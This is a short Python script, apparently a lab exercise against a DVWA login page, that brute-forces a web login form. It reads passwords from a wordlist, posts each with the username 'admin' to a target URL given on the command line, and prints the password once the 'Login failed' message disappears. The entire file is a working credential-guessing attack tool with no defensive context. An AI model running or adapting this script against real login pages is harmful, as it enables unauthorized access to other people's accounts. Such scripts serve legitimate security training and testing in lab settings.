#!/usr/bin/env python
import argparse
import requests
def get_arguments():
    # This will give user a neat CLI
    parser = argparse.ArgumentParser()
    # We need the interface name
    parser.add_argument("-t", "--target",
                        dest="target",
                        help="Target URL to scan")
    options = parser.parse_args()
    # Check if target URL was given
    if not options.target:
        parser.error("[!] Please specify a target URL using -t or --target")
    return options
#target_url = "http://192.168.81.133/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}
options = get_arguments()
target_url = options.target
with open("/root/PycharmProjects/PI/dict.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
